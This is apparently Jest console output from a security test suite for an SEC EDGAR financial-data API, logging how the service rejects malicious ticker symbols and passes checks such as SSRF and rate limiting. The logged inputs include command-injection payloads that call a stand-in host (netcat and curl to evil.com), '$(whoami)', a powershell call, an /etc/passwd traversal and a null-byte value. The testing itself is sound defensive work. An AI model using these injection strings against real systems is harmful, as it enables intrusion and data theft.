      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL | nc evil.com 1234

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL $(whoami)

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL $(whoami)

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL `id`

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL `id`

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL; curl http://evil.com/steal

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL; curl http://evil.com/steal

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL & powershell -c "malicious command"

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL & powershell -c "malicious command"

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.error
    No CIK found for symbol AAPL; ping evil.com

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:115:36)

  console.error
    No CIK found for symbol AAPL; ping evil.com

      200 |       const cik = await this.symbolToCik(symbol)
      201 |       if (!cik) {
    > 202 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      203 |         return []
      204 |       }
      205 |

      at SECEdgarAPI.getForm4Transactions (app/services/financial-data/SECEdgarAPI.ts:202:17)
      at SECEdgarAPI.getInsiderSentiment (app/services/financial-data/SECEdgarAPI.ts:258:28)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:116:33)

  console.log
    ✓ Command injection attempts properly handled

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:124:15)

  console.log
    ✓ Legitimate symbols properly normalized

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:145:15)

  console.error
    No CIK found for symbol AAPL .txt

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:158:32)

  console.error
    No CIK found for symbol AAPL /etc/passwd

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:158:32)

  console.error
    No CIK found for symbol AAPL 

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:158:32)

  console.error
    No CIK found for symbol AAPL malicious

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:158:32)

  console.error
    No CIK found for symbol AAPL%00.php

      158 |       const cik = await this.symbolToCik(symbol)
      159 |       if (!cik) {
    > 160 |         console.error(`No CIK found for symbol ${symbol}`)
          |                 ^
      161 |         return []
      162 |       }
      163 |

      at SECEdgarAPI.get13FHoldings (app/services/financial-data/SECEdgarAPI.ts:160:17)
      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:158:32)

  console.log
    ✓ Null byte injection attempts properly rejected

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:163:15)

  console.log
    ✓ Rate limiting enforced: 368ms for 3 sequential requests (minimum 200ms required)

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:181:15)

  console.log
    ✓ Rate limiting maintained across methods: 4852ms

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:215:15)

  console.log
    ✓ Rate limit violations handled gracefully

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:238:15)

  console.log
    ✓ User-Agent compliant: VFR-API/1.0 (contact@veritak.com)

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:253:15)

  console.log
    ✓ Concurrent rate limiting: 3152ms for 5 operations

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:276:15)

  console.log
    ✓ SSL certificate validation working

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:290:15)

  console.log
    ✓ SSRF prevention working

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:309:15)

  console.log
    ✓ Timeout attack handled: 52ms duration, request timed out

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:363:17)

  console.log
    ✓ Request smuggling prevention working

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:381:15)

  console.log
    ✓ Response data structure validation working

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:409:15)

  console.log
    ✓ Prototype pollution prevention working

      at Object.<anonymous> (app/services/financial-data/__tests__/SECEdgarAPI.security.test.ts:431:15)

